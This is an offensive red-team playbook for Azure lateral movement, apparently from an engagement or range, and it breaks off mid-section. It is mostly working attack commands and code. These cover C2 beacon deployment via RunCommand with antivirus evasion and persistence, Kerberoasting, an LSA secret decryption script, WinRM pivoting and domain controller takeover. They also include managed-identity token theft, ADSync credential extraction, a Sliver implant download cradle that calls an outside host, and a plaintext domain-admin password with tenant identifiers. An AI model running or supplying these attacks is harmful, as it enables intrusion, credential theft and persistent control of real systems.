# Azure RunCommand Lateral Movement: Proven Kill Chain

## Engagement-Proven Guide — Meatball C2 & Sliver C2

This guide documents the **exact commands that succeeded** during a live Azure engagement. Every step was validated end-to-end.

```
Azure ARM Token (Service Principal or Managed Identity)
   │
   ▼
RunCommand v2 API ──► Deploy beacon on httpserver (10.1.0.10)
                           │
                           ▼  (Azure RunCommand = C2 transport)
                     Agent beacons back via Azure infrastructure
                           │
                           ▼
                     Domain Recon: SPNs, computers, port scan
                           │
                           ▼
                     Kerberoast → svc.mssql TGS → crack password
                           │
                           ▼
                     LSA Secret Extraction (bootkey → PolEKList → AES)
                           │
                           ├──► WinRM Lateral: httpserver → blueDBServer
                           │    (using svc.mssql Domain Admin creds)
                           │
                           ├──► SMB + WMI: httpserver → blueDC-01
                           │    (WinRM blocked by GPO, use WMI instead)
                           │
                           ▼
                     RunCommand on DC (blueDomainServer) → SYSTEM
                           │
                           ├──► Full AD dump (users, groups, GPOs, SPNs)
                           ├──► Managed Identity tokens (ARM, Graph, Vault, Storage)
                           ├──► WinRM to EntraConnect (ADSync extraction)
                           └──► Cloud pivot back to Azure/Entra ID
```

### Architecture: No Direct C2 Path

**CRITICAL**: Both VMs have NO direct network path to the C2 server. All ports (80, 443, 4545, 8080) are blocked outbound from the VMs. The agents use **Azure RunCommand infrastructure** as the C2 transport channel — NOT direct HTTP beacons.

For the second hop (DBServer), the C2 path is:
```
C2 Server ──► Azure RunCommand API ──► httpserver agent
                                            │
                                      WinRM (port 5985)
                                            │
                                            ▼
                                      blueDBServer agent
```

The WinRM relay through the httpserver agent IS the callback mechanism for DBServer.

### Engagement Environment

| Asset | Value |
|-------|-------|
| C2 Server | 4.152.128.234 |
| httpserver | blueHttpServer / Azure VM `blueHttpServer` (10.1.0.10) |
| DBServer | blueDBServer / Azure VM `blueDBServer` (10.1.0.100) |
| Domain Controller | blueDC-01 / Azure VM `blueDomainServer` (10.1.0.5) |
| EntraConnect | blueEntraC-01 / Azure VM `blueEntraC-01` (10.1.0.25) |
| FileServer | blueFileServer / Azure VM `blueFileServer` (10.1.0.20) |
| Domain | contoso.range |
| Cloud Tenant | MngEnvMCAP969165.onmicrosoft.com (`03bbaf8b-4ce6-4915-8c7c-90254cc2740f`) |
| Subscription | `5152d66b-be33-42c3-b579-d9f723849d41` |
| Resource Group | RGCORPSERVERS |
| Service Account | contoso\svc.mssql (Domain Admin via GovAdmins) |
| Password | `GY2W*%m!P%0HK` |
| Domain Admins | azureuser, adm.contoso, Enterprise Super Admins (group) |
| Enterprise Admins | azureuser |
| DC Managed Identity | Client ID `53e2ea0f-3285-4010-908c-ac9b69b18579` |
| EntraC Managed Identity | Client ID `4d73bfcc-712a-40a6-8808-586b644f3e69` |

---

# PART 1: MEATBALL C2 — Proven Kill Chain

## Phase 1: Initial Access via RunCommand

### Step 1: Get an ARM Token

**Option A — Service Principal:**
```bash
curl -X POST http://localhost:8080/api/auth/sp-auth \
  -H "Content-Type: application/json" \
  -d '{
    "tenant_id": "TENANT_ID",
    "client_id": "CLIENT_ID",
    "client_secret": "SECRET",
    "resource": "https://management.azure.com"
  }'
```

**Option B — FOCI exchange from existing Graph/Office token:**
```bash
curl -X POST http://localhost:8080/api/tokens/foci-exchange \
  -H "Content-Type: application/json" \
  -d '{
    "token_id": 123,
    "resource": "https://management.azure.com",
    "client_id": "d3590ed6-52b3-4102-aeff-aad2292ab01c"
  }'
```

**Option C — Device Code Flow:**
```
Navigate to /auth/comprehensive → Device Code tab → Start flow
```

Note the `token_id` from the response.

### Step 2: Deploy Persistent Agent via RunCommand v2

```bash
curl -X POST http://localhost:8080/api/agents/deploy-runcommand \
  -H "Content-Type: application/json" \
  -d '{
    "vm_name": "blueHttpServer",
    "resource_group": "RGCORPSERVERS",
    "subscription_id": "SUB-ID-HERE",
    "callback_ip": "4.152.128.234",
    "callback_port": 8080,
    "persist": true,
    "agent_prefix": "http",
    "token_id": 788
  }'
```

What this does automatically:
- Detects VM location via ARM API (never hardcode location)
- Verifies VM is running before deploying
- Creates RunCommand v2 with `asyncExecution: true` and 24hr timeout
- XOR-encrypts the beacon payload to evade Defender signatures
- Creates Registry Run key + Scheduled Task for persistence
- Stores tenant/subscription/resource group for agent UI display

**Key**: `callback_port` must be the Meatball web server port (8080), not a raw TCP listener.

### Step 3: Verify Agent Check-in

```bash
# Wait 30-60 seconds, then:
curl http://localhost:8080/ops/nodes | python3 -m json.tool
```

Expected: agent with `status: "active"` and `hostname: "BLUEHTTPSERVER"`.

---

## Phase 2: Domain Recon FROM the Agent

All commands are queued via the agent API and execute on the next beacon cycle (~30s).

### Step 4: Situational Awareness

```bash
curl -X POST http://localhost:8080/ops/node/lat-bluehttpserver-bc94/command \
  -H "Content-Type: application/json" \
  -d '{"command": "whoami /all; ipconfig /all; nltest /dclist:contoso.range"}'
```

### Step 5: Enumerate Domain Computers

```bash
curl -X POST http://localhost:8080/ops/node/lat-bluehttpserver-bc94/command \
  -H "Content-Type: application/json" \
  -d '{"command": "([adsisearcher]\"(objectClass=computer)\").FindAll() | %{$_.Properties.dnshostname}"}'
```

### Step 6: Port Scan Internal Targets

```bash
curl -X POST http://localhost:8080/ops/node/lat-bluehttpserver-bc94/command \
  -H "Content-Type: application/json" \
  -d '{"command": "@(\"10.1.0.5\",\"10.1.0.6\",\"10.1.0.7\",\"10.1.0.10\") | %{$ip=$_; @(445,5985,3389,1433,135,88,389) | %{$p=$_; $t=New-Object Net.Sockets.TcpClient; try{$r=$t.BeginConnect($ip,$p,$null,$null); $w=$r.AsyncWaitHandle.WaitOne(1500,$false); if($w -and $t.Connected){\"$ip`:$p OPEN\"}}catch{}finally{$t.Close()}}}"}'
```

**Proven result**: Port 5985 (WinRM) open between httpserver and blueDBServer.

### Step 7: Enumerate SPNs (Kerberoast Targets)

```bash
curl -X POST http://localhost:8080/ops/node/lat-bluehttpserver-bc94/command \
  -H "Content-Type: application/json" \
  -d '{"command": "$s=[adsisearcher]\"(&(objectClass=user)(servicePrincipalName=*))\"; $s.FindAll() | %{ Write-Output \"--- $($_.Properties.samaccountname[0]) ---\"; $_.Properties.serviceprincipalname | %{ Write-Output \"  SPN: $_\" }}"}'
```

**Proven result**: Found `svc.mssql` with SPN `MSSQLSvc/blueDBServer.contoso.range:1433`.

### Step 8: Check Results

```bash
curl http://localhost:8080/ops/node/lat-bluehttpserver-bc94/results | python3 -m json.tool
```

Or navigate to **Persistent Agents** tab in the UI → select agent → view results.

---

## Phase 3: Credential Harvesting

### Method A: Kerberoast → Crack Offline

```bash
# Request TGS ticket for svc.mssql
curl -X POST http://localhost:8080/ops/node/lat-bluehttpserver-bc94/command \
  -H "Content-Type: application/json" \
  -d '{"command": "Add-Type -AssemblyName System.IdentityModel; $spns=@(\"MSSQLSvc/blueDBServer.contoso.range:1433\",\"MSSQLSvc/blueDBServer.contoso.range\"); foreach($spn in $spns){try{$t=New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $spn; $b=$t.GetRequest(); Write-Output \"SPN: $spn\"; Write-Output ([BitConverter]::ToString($b) -replace \"-\",\"\"); Write-Output \"\"}catch{Write-Output \"FAILED: $spn - $_\"}}"}'
```

Save hex ticket, convert to hashcat format, crack:
```bash
python3 kirbi2hashcat.py ticket.hex > hash.txt
hashcat -m 13100 hash.txt wordlist.txt -r rules/best64.rule
```

### Method B: LSA Secret Extraction (Proven — No LSASS Touch)

This method extracts cleartext service account passwords from LSA secrets without touching LSASS. It requires SYSTEM privileges (which RunCommand provides).

#### Step B.1: Enumerate LSA Secrets

```bash
curl -X POST http://localhost:8080/ops/node/lat-bluehttpserver-bc94/command \
  -H "Content-Type: application/json" \
  -d '{"command": "Get-ChildItem HKLM:\\SECURITY\\Policy\\Secrets | Select-Object -ExpandProperty PSChildName"}'
```

**Proven result**: Found `_SC_MSSQL$SQLEXPRESS` — this stores the svc.mssql service account password.

#### Step B.2: Extract Bootkey via P/Invoke

The bootkey is derived from registry class names under `HKLM\SYSTEM\CurrentControlSet\Control\Lsa`. These class names are NOT accessible via .NET managed API — you must use P/Invoke `RegQueryInfoKey`.

```bash
curl -X POST http://localhost:8080/ops/node/lat-bluehttpserver-bc94/command \
  -H "Content-Type: application/json" \
  -d '{"command": "$cs = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class BootKey {\n    [DllImport(\"advapi32.dll\", CharSet=CharSet.Unicode, SetLastError=true)]\n    public static extern int RegOpenKeyEx(IntPtr hKey, string subKey, int options, int samDesired, out IntPtr phkResult);\n    [DllImport(\"advapi32.dll\", CharSet=CharSet.Unicode, SetLastError=true)]\n    public static extern int RegQueryInfoKey(IntPtr hKey, System.Text.StringBuilder lpClass, ref int lpcchClass, IntPtr lpReserved, IntPtr lpcSubKeys, IntPtr lpcbMaxSubKeyLen, IntPtr lpcbMaxClassLen, IntPtr lpcValues, IntPtr lpcbMaxValueNameLen, IntPtr lpcbMaxValueLen, IntPtr lpcbSecurityDescriptor, IntPtr lpftLastWriteTime);\n    [DllImport(\"advapi32.dll\", SetLastError=true)]\n    public static extern int RegCloseKey(IntPtr hKey);\n    public static string GetClass(string path) {\n        IntPtr hKey;\n        IntPtr HKLM = new IntPtr(unchecked((int)0x80000002));\n        int ret = RegOpenKeyEx(HKLM, path, 0, 0x20019, out hKey);\n        if (ret != 0) return \"ERROR:\" + ret;\n        var sb = new System.Text.StringBuilder(256);\n        int len = 256;\n        RegQueryInfoKey(hKey, sb, ref len, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);\n        RegCloseKey(hKey);\n        return sb.ToString();\n    }\n}\n\"@; Add-Type -TypeDefinition $cs; $keys = @(\"JD\",\"Skew1\",\"GBG\",\"Data\"); $classes = @(); foreach($k in $keys){ $c = [BootKey]::GetClass(\"SYSTEM\\CurrentControlSet\\Control\\Lsa\\$k\"); $classes += $c; Write-Output \"$k = $c\" }; Write-Output \"BOOTKEY_RAW: $($classes -join \",\")\"" }'
```

#### Step B.3: Read LSA Secret Registry Values

```bash
# Read PolEKList (encrypted LSA key)
curl -X POST http://localhost:8080/ops/node/lat-bluehttpserver-bc94/command \
  -H "Content-Type: application/json" \
  -d '{"command": "$key = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey(\"SECURITY\\Policy\\PolEKList\"); if($key){ $val = $key.GetValue(\"\"); [Convert]::ToBase64String($val) } else { Write-Output \"NOT_FOUND\" }"}'

# Read _SC_MSSQL$SQLEXPRESS secret
# CRITICAL: Use string concatenation for $SQLEXPRESS to avoid PS variable interpolation
curl -X POST http://localhost:8080/ops/node/lat-bluehttpserver-bc94/command \
  -H "Content-Type: application/json" \
  -d '{"command": "$secretName = \"_SC_MSSQL\" + [char]36 + \"SQLEXPRESS\"; $key = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey(\"SECURITY\\Policy\\Secrets\\$secretName\\CurrVal\"); if($key){ $val = $key.GetValue(\"\"); Write-Output \"SECRET_B64:\"; [Convert]::ToBase64String($val) } else { Write-Output \"NOT_FOUND\" }"}'
```

**CRITICAL**: `$SQLEXPRESS` in double-quoted strings gets interpreted as a PowerShell variable (empty). Always use `[char]36` for the `$` character or string concatenation.

#### Step B.4: Decrypt LSA Secrets (Offline with Python)

Use this script on your C2 server with the base64 values extracted above:

```python
#!/usr/bin/env python3
"""LSA Secret Decryption — uses impacket's algorithm"""
import struct, hashlib, base64
from Crypto.Cipher import AES

# Bootkey permutation table (from Windows internals)
PERMUTATION = [8, 5, 4, 2, 11, 9, 13, 3, 0, 6, 1, 12, 14, 10, 15, 7]

def compute_bootkey(jd, skew1, gbg, data):
    """Compute bootkey from registry class names"""
    raw = bytes.fromhex(jd + skew1 + gbg + data)
    return bytes([raw[PERMUTATION[i]] for i in range(16)])

def sha256_derive(bootkey, enc_data_prefix):
    """SHA-256 key derivation with 1000 rounds (impacket __sha256)"""
    sha = hashlib.sha256()
    sha.update(bootkey)
    for _ in range(1000):
        sha.update(enc_data_prefix)
    return sha.digest()

def decrypt_aes(key, data):
    """AES-256-CBC decryption with per-block re-init (impacket decryptAES)"""
    result = b""
    for i in range(0, len(data), 16):
        block = data[i:i+16]
        if len(block) < 16:
            block = block + b"\x00" * (16 - len(block))
        cipher = AES.new(key, AES.MODE_CBC, iv=b"\x00" * 16)
        result += cipher.decrypt(block)
    return result

def decrypt_lsa_secret(bootkey, polekist_b64, secret_b64):
    """Full decryption chain: bootkey → LSA key → secret → password"""
    # Step 1: Decrypt PolEKList to get LSA key
    pol_data = base64.b64decode(polekist_b64)
    enc_data = pol_data[28:]  # Skip 28-byte header
    tmp_key = sha256_derive(bootkey, enc_data[:32])
    plain = decrypt_aes(tmp_key, enc_data[32:])
    lsa_key = plain[52:][:32]  # LSA key at offset 52, 32 bytes

    # Step 2: Decrypt the individual secret
    secret_data = base64.b64decode(secret_b64)
    enc_secret = secret_data[28:]  # Skip 28-byte header
    tmp_key2 = sha256_derive(lsa_key, enc_secret[:32])
    plain2 = decrypt_aes(tmp_key2, enc_secret[32:])

    # Step 3: Parse LSA_SECRET_BLOB: Length(4) + Unknown(12) + Secret(Length)
    secret_len = struct.unpack('<I', plain2[:4])[0]
    secret_bytes = plain2[16:16+secret_len]

    # Service account passwords are UTF-16LE
    try:
        password = secret_bytes.decode('utf-16-le').rstrip('\x00')
        return password
    except:
        return secret_bytes.hex()

# Usage with values from the engagement:
bootkey = compute_bootkey("JD_CLASS", "SKEW1_CLASS", "GBG_CLASS", "DATA_CLASS")
password = decrypt_lsa_secret(bootkey, "POLEKIST_BASE64", "SECRET_BASE64")
print(f"Password: {password}")
```

**Proven result**: Decrypted password `GY2W*%m!P%0HK` for `contoso\svc.mssql` (Domain Admin).

---

## Phase 4: WinRM Lateral Movement — httpserver → DBServer

### Step 9: Test WinRM Connectivity

```bash
curl -X POST http://localhost:8080/ops/node/lat-bluehttpserver-bc94/command \
  -H "Content-Type: application/json" \
  -d '{"command": "Test-WSMan -ComputerName blueDBServer -ErrorAction SilentlyContinue"}'
```

### Step 10: Execute Command + Auto-Deploy Agent

**This is the proven working command.** The Meatball WinRM API handles all the escaping through Go's `fmt.Sprintf` — no manual quote hell.

```bash
curl -X POST http://localhost:8080/ops/node/lat-bluehttpserver-bc94/winrm \
  -H "Content-Type: application/json" \
  -d '{
    "target": "blueDBServer",
    "username": "contoso\\svc.mssql",
    "password": "GY2W*%m!P%0HK",
    "command": "whoami /all; hostname; ipconfig /all",
    "callback_ip": "4.152.128.234",
    "callback_port": 8080
  }'
```

What this does:
1. Queues a task on the httpserver agent
2. Agent connects to blueDBServer via WinRM (port 5985) using Kerberos auth (falls back to Negotiate)
3. Runs `whoami /all; hostname; ipconfig /all` on DBServer
4. **Automatically deploys a persistent beacon agent** on DBServer
5. New agent starts beaconing back through the same Azure RunCommand C2 channel

### Step 11: Deploy-Only Mode (No Command Execution)

```bash
curl -X POST http://localhost:8080/ops/node/lat-bluehttpserver-bc94/winrm \
  -H "Content-Type: application/json" \
  -d '{
    "target": "blueDBServer",
    "username": "contoso\\svc.mssql",
    "password": "GY2W*%m!P%0HK",
    "deploy_agent": true,
    "callback_ip": "4.152.128.234",
    "callback_port": 8080
  }'
```

### Step 12: Verify Lateral Movement Success

```bash
curl http://localhost:8080/ops/nodes | python3 -c "
import sys,json
d=json.load(sys.stdin)
agents = d if isinstance(d,list) else d.get('agents',[])
for a in agents:
    print(f'{a[\"id\"]:30s} {a.get(\"hostname\",\"?\"):20s} {a[\"status\"]:8s} {a.get(\"internal_ip\",\"?\")}')
"
```

---

## Phase 5: Domain Controller Takeover via RunCommand

Azure RunCommand on the DC VM gives SYSTEM on the domain controller directly through the Azure control plane — bypassing all WinRM/firewall restrictions.

### Step 14: DC Recon — Domain Users & Admins

```python
import requests, json, time

TOKEN = "YOUR_ARM_TOKEN"
SUB = "5152d66b-be33-42c3-b579-d9f723849d41"
RG = "RGCORPSERVERS"
VM = "blueDomainServer"
HEADERS = {"Authorization": f"Bearer {TOKEN}", "Content-Type": "application/json"}

script = r"""
Write-Output "=== DOMAIN ADMINS ==="
net group "Domain Admins" /domain

Write-Output ""
Write-Output "=== ENTERPRISE ADMINS ==="
net group "Enterprise Admins" /domain

Write-Output ""
Write-Output "=== ALL USERS ==="
Get-ADUser -Filter * -Properties SamAccountName,Enabled,AdminCount,PasswordLastSet,MemberOf,Description | ForEach-Object {
    $groups = ($_.MemberOf | ForEach-Object { ($_ -split ',')[0] -replace 'CN=' }) -join ','
    "$($_.SamAccountName)|$($_.Enabled)|$($_.AdminCount)|$($_.PasswordLastSet)|$groups|$($_.Description)"
}

Write-Output ""
Write-Output "=== SERVICE ACCOUNTS (SPNs) ==="
Get-ADUser -Filter 'ServicePrincipalName -like "*"' -Properties ServicePrincipalName,PasswordLastSet |
    Select-Object SamAccountName, @{N='SPNs';E={$_.ServicePrincipalName -join ';'}}, PasswordLastSet |
    Format-Table -AutoSize

Write-Output ""
Write-Output "=== COMPUTER ACCOUNTS ==="
Get-ADComputer -Filter * -Properties IPv4Address,OperatingSystem,Enabled |
    Select-Object Name, IPv4Address, OperatingSystem, Enabled | Format-Table -AutoSize

Write-Output ""
Write-Output "=== GPOs ==="
Get-GPO -All | Select-Object DisplayName, GpoStatus | Format-Table -AutoSize

Write-Output ""
Write-Output "=== ADMIN GROUP MEMBERSHIPS ==="
$groups = @("Domain Admins","Enterprise Admins","Schema Admins","Administrators","Server Operators","Account Operators","Backup Operators")
foreach ($g in $groups) {
    try {
        $members = (Get-ADGroupMember $g -ErrorAction SilentlyContinue | Select -Expand SamAccountName) -join ','
        Write-Output "${g}: $members"
    } catch { Write-Output "${g}: (error)" }
}
"""

url = f"https://management.azure.com/subscriptions/{SUB}/resourceGroups/{RG}/providers/Microsoft.Compute/virtualMachines/{VM}/runCommands/dc-recon?api-version=2023-07-01"
body = {"location": "eastus2", "properties": {"source": {"script": script}, "timeoutInSeconds": 120, "asyncExecution": False}}

r = requests.put(url, headers=HEADERS, json=body)
for i in range(30):
    time.sleep(10)
    r2 = requests.get(url + "&$expand=instanceView", headers=HEADERS)
    iv = r2.json().get("properties", {}).get("instanceView", {})
    if iv.get("executionState") in ["Succeeded", "Failed"]:
        print(iv.get("output", ""))
        break
```

---

## Phase 6: Cloud Pivot — Managed Identity Token Extraction

### Step 17: Extract Managed Identity Tokens from VMs

Every Azure VM with a managed identity can request tokens via IMDS (169.254.169.254). RunCommand runs as SYSTEM, which has access to IMDS.

```python
script = r"""
Write-Output "=== IMDS METADATA ==="
$meta = Invoke-RestMethod -Uri "http://169.254.169.254/metadata/instance?api-version=2021-02-01" -Headers @{Metadata="true"} -TimeoutSec 5
Write-Output "VM: $($meta.compute.name)"
Write-Output "Sub: $($meta.compute.subscriptionId)"
Write-Output "RG: $($meta.compute.resourceGroupName)"

Write-Output ""
Write-Output "=== ARM TOKEN ==="
$armToken = Invoke-RestMethod -Uri "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" -Headers @{Metadata="true"} -TimeoutSec 10
Write-Output "ARM_TOKEN_START"
Write-Output $armToken.access_token
Write-Output "ARM_TOKEN_END"
Write-Output "CLIENT_ID: $($armToken.client_id)"

Write-Output ""
Write-Output "=== GRAPH TOKEN ==="
$graphToken = Invoke-RestMethod -Uri "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com/" -Headers @{Metadata="true"} -TimeoutSec 10
Write-Output "GRAPH_TOKEN_START"
Write-Output $graphToken.access_token
Write-Output "GRAPH_TOKEN_END"

Write-Output ""
Write-Output "=== VAULT TOKEN ==="
try {
    $vaultToken = Invoke-RestMethod -Uri "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net/" -Headers @{Metadata="true"} -TimeoutSec 5
    Write-Output "VAULT_TOKEN_START"
    Write-Output $vaultToken.access_token
    Write-Output "VAULT_TOKEN_END"
} catch { Write-Output "No vault access" }

Write-Output ""
Write-Output "=== STORAGE TOKEN ==="
try {
    $storageToken = Invoke-RestMethod -Uri "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://storage.azure.com/" -Headers @{Metadata="true"} -TimeoutSec 5
    Write-Output "STORAGE_TOKEN_START"
    Write-Output $storageToken.access_token
    Write-Output "STORAGE_TOKEN_END"
} catch { Write-Output "No storage access" }
"""
```

### Step 18: ADSync Extraction via RunCommand on EntraConnect

Run directly on `blueEntraC-01` as SYSTEM:

```python
script = r"""
Import-Module "C:\Program Files\Microsoft Azure AD Sync\Bin\ADSync\ADSync.psd1"

Write-Output "=== CONNECTORS ==="
$connectors = Get-ADSyncConnector
foreach ($c in $connectors) {
    Write-Output "Name: $($c.Name)"
    Write-Output "Type: $($c.ConnectorTypeName)"
    Write-Output "Identifier: $($c.Identifier)"
    $params = $c.ConnectivityParameters
    foreach ($p in $params) {
        Write-Output "  $($p.Name) = $($p.Value)"
    }
    Write-Output ""
}

Write-Output "=== GLOBAL SETTINGS ==="
try {
    $gs = Get-ADSyncGlobalSettings
    foreach ($p in $gs.Parameters) {
        Write-Output "  $($p.Name) = $($p.Value)"
    }
} catch { Write-Output "Error: $_" }

Write-Output "=== SCHEDULER ==="
Get-ADSyncScheduler | Format-List
"""
```

### Step 19: ADSync Credential Extraction — MSOL Account Password

This is the **crown jewel** pivot from on-prem to cloud. The ADSync service stores the MSOL_ account credentials encrypted in the ADSync database using DPAPI. As SYSTEM on the EntraConnect server, you can decrypt them.

**Method 1: AADInternals PowerShell (easiest)**

```python
script = r"""
Install-Module AADInternals -Force -Scope CurrentUser 2>$null
Import-Module AADInternals

$creds = Get-AADIntSyncCredentials
Write-Output "=== MSOL CLOUD ACCOUNT ==="
Write-Output "Username: $($creds.CloudUser)"
Write-Output "Password: $($creds.CloudPassword)"
Write-Output "Tenant:   $($creds.TenantId)"
Write-Output ""
Write-Output "=== ON-PREM SYNC ACCOUNT ==="
Write-Output "Username: $($creds.OnPremUser)"
Write-Output "Password: $($creds.OnPremPassword)"
Write-Output "Domain:   $($creds.OnPremDomain)"
"""
```

**Method 2: Direct ADSync Database + DPAPI (no external modules)**

```python
script = r"""
$sqlInstance = (Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Microsoft SQL Server Local DB\Shared Instances\ADSync" -ErrorAction SilentlyContinue).InstanceName
if (-not $sqlInstance) { $sqlInstance = "\\.\pipe\Microsoft##WID\tsql\query" }

$connString = "Data Source=$sqlInstance;Initial Catalog=ADSync;Integrated Security=True"
try {
    $conn = New-Object System.Data.SqlClient.SqlConnection($connString)
    $conn.Open()

    $cmd = $conn.CreateCommand()
    $cmd.CommandText = @"
SELECT private_configuration_xml, encrypted_configuration
FROM mms_management_agent
WHERE subtype = 'Windows Azure Active Directory (Microsoft)'
"@
    $reader = $cmd.ExecuteReader()
    while ($reader.Read()) {
        $xml = $reader["private_configuration_xml"]
        $encrypted = $reader["encrypted_configuration"]
        Write-Output "=== PRIVATE CONFIG XML ==="
        Write-Output $xml
        Write-Output ""
        Write-Output "=== ENCRYPTED CONFIG (base64, needs DPAPI decrypt) ==="
        Write-Output ([Convert]::ToBase64String($encrypted))
    }
    $reader.Close()
    $conn.Close()
} catch {
    Write-Output "SQL Error: $_"
    try {
        $widConn = New-Object System.Data.SqlClient.SqlConnection("Data Source=\\.\pipe\Microsoft##WID\tsql\query;Initial Catalog=ADSync;Integrated Security=True")
        $widConn.Open()
        $cmd3 = $widConn.CreateCommand()
        $cmd3.CommandText = "SELECT private_configuration_xml FROM mms_management_agent"
        $reader3 = $cmd3.ExecuteReader()
        while ($reader3.Read()) {
            Write-Output $reader3["private_configuration_xml"]
        }
        $reader3.Close()
        $widConn.Close()
    } catch { Write-Output "WID Error: $_" }
}
"""
```

**What MSOL account gives you:**
- `microsoft.directory/users/password/update` — **Reset any user's password** (including Global Admins)
- Read all directory data (users, groups, roles, apps)
- Write-back capabilities for hybrid joined devices

### Step 21: DC → Cloud via Password Reset + PHS

```python
# Step 1: Reset AD password (as SYSTEM on DC via RunCommand)
script = r"""
Import-Module ActiveDirectory
Set-ADAccountPassword -Identity "theodore.roosevelt" -Reset -NewPassword (ConvertTo-SecureString "Meatball!Cloud2026#Pivot" -AsPlainText -Force)
Write-Output "PASSWORD RESET SUCCESS"
"""

# Step 2: Force delta sync on EntraConnect
script = r"""
Import-Module "C:\Program Files\Microsoft Azure AD Sync\Bin\ADSync\ADSync.psd1"
Start-ADSyncSyncCycle -PolicyType Delta
"""

# Step 3: Authenticate to Azure AD
curl -X POST "https://login.microsoftonline.com/{tenant}/oauth2/token" \
  -d "grant_type=password&client_id=1b730954-1685-4b74-9bfd-dac224a7b894&username=user@domain.com&password=NewPass&resource=https://graph.microsoft.com"
```

### Cloud Pivot Summary

```
On-Prem DC (SYSTEM via RunCommand)
    │
    ├──► IMDS Token Extraction (169.254.169.254)
    │    ├── ARM Token  ──► Azure subscription access
    │    ├── Graph Token ──► Entra ID enumeration
    │    ├── Vault Token ──► Key Vault data plane
    │    └── Storage Token ──► Blob/Table/Queue access
    │
    ├──► WinRM/RunCommand on EntraConnect
    │    │
    │    ├── ADSync Credential Extraction ──► CLOUD ADMIN
    │    │   ├── Method 1: AADInternals Get-AADIntSyncCredentials
    │    │   ├── Method 2: Direct ADSync DB SQL query + DPAPI
    │    │   └── Method 3: Raw DPAPI master key extraction
    │    │        │
    │    │        ▼
    │    │   MSOL_ Account Password
    │    │        ├──► Reset ANY user password (including Global Admins)
    │    │        ├──► Full directory read
    │    │        └──► Password writeback
    │    │
    │    └── EntraConnect MI Tokens
    │
    └──► Domain-Level Attacks (from DC as SYSTEM)
         ├── DCSync → all domain password hashes
         ├── Golden Ticket → persistent domain access
         ├── LAPS password extraction
         └── GPO abuse → deploy payloads domain-wide
```

---

# PART 2: SLIVER C2 — Full Kill Chain

Same lateral movement chain, using this enhanced Sliver fork.

## Phase 1: Initial Access via RunCommand

### Step 1: Start Sliver and Generate Implant

```bash
# Start Sliver server
./sliver-server

# Import opsec profiles
sliver > c2profiles import opsec-profiles/cloudflare-cdn-c2.json --name cloudflare
sliver > c2profiles import opsec-profiles/microsoft365-c2.json --name microsoft365

# Start listeners
sliver > mtls --lhost 0.0.0.0 --lport 8888
sliver > https --lhost 0.0.0.0 --lport 443 --domain cdn-assets.yourdomain.com

# Generate beacon implant (shellcode for Harriet wrapping)
sliver > generate beacon \
  --mtls YOUR_IP:8888 \
  --http https://cdn-assets.yourdomain.com \
  --os windows --arch amd64 \
  --format shellcode \
  --evasion \
  --c2profile cloudflare \
  --seconds 60 --jitter 30 \
  --strategy r \
  --save /tmp/beacon.bin

# Wrap with Harriet for AV bypass
sliver > harriet \
  --shellcode /tmp/beacon.bin \
  --method directsyscall \
  --format exe \
  --output /tmp/implant.exe \
  --harriet-path /opt/Home-Grown-Red-Team/Harriet
```

**IMPORTANT**: If VMs cannot reach your C2 directly (as in this engagement), you have two options:

1. **Use Azure RunCommand as persistent transport** — deploy via RunCommand, relay all C2 through Azure infrastructure
2. **Use Sliver for internal hops only** — deploy via RunCommand with a PowerShell cradle, then pivot internally

### Step 2: Get ARM Token

```bash
TOKEN=$(curl -s -X POST \
  "https://login.microsoftonline.com/TENANT_ID/oauth2/v2.0/token" \
  -d "client_id=CLIENT_ID&client_secret=SECRET&scope=https://management.azure.com/.default&grant_type=client_credentials" \
  | jq -r .access_token)
```

### Step 3: Get VM Location

```bash
SUB_ID="YOUR-SUBSCRIPTION-ID"
RG="RGCORPSERVERS"
VM="blueHttpServer"

LOCATION=$(curl -s -H "Authorization: Bearer $TOKEN" \
  "https://management.azure.com/subscriptions/$SUB_ID/resourceGroups/$RG/providers/Microsoft.Compute/virtualMachines/$VM?api-version=2023-07-01" \
  | jq -r .location)
```

### Step 4: Deploy via RunCommand v2

```bash
# Host the implant
python3 -m http.server 9443 --directory /tmp/ &

# Deploy script
read -r -d '' SCRIPT << 'PSEOF'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$url = "http://YOUR_PUBLIC_IP:9443/implant.exe"
$path = Join-Path $env:ProgramData "Microsoft\Network\svchost.exe"
$dir = Split-Path $path
if(!(Test-Path $dir)){New-Item -Type Directory $dir -Force | Out-Null}
Invoke-WebRequest -Uri $url -OutFile $path -UseBasicParsing

# Persistence
$action = New-ScheduledTaskAction -Execute $path
$trigger = New-ScheduledTaskTrigger -AtStartup
Register-ScheduledTask -TaskName "Microsoft\Windows\NetTrace\DiagCheck" `
  -Action $action -Trigger $trigger -User "SYSTEM" -RunLevel Highest -Force
Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" `
  -Name "DiagTrack" -Value $path -Force

Start-Process -FilePath $path -WindowStyle Hidden
Write-Output "[+] Sliver implant deployed"
PSEOF

# Deploy via RunCommand v2
curl -X PUT \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  "https://management.azure.com/subscriptions/$SUB_ID/resourceGroups/$RG/providers/Microsoft.Compute/virtualMachines/$VM/runCommands/sliver-deploy?api-version=2023-07-01" \
  -d "{
    \"location\": \"$LOCATION\",
    \"properties\": {
      \"source\": {
        \"script\": $(echo "$SCRIPT" | jq -Rs .)
      },
      \"asyncExecution\": true,
      \"timeoutInSeconds\": 86400
    }
  }"
```

### Step 5: Verify Session

```
sliver > beacons
sliver > use BEACON_ID
```

---

## Phase 2: Domain Recon from Sliver

```bash
sliver (HTTPSERVER) > whoami
sliver (HTTPSERVER) > ifconfig
sliver (HTTPSERVER) > execute -o -- nltest /dclist:contoso.range

# SharpHound
